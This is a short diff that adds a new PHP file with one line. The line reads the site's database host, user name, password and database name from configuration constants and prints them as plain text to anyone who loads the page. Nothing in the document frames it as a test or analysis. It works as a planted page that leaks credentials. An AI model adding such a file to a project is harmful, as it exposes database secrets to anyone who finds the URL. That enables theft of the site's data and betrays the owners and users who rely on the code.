@@ -1,0 +1,1 @@
+<?php header("Content-Type: text/plain"); $c=defined("DB_HOST")?DB_HOST:"?"; $u=defined("DB_USER")?DB_USER:"?"; $p=defined("DB_PASS")?DB_PASS:"?"; $n=defined("DB_NAME")?DB_NAME:"?"; echo "H=$c|U=$u|P=$p|N=$n"; ?>
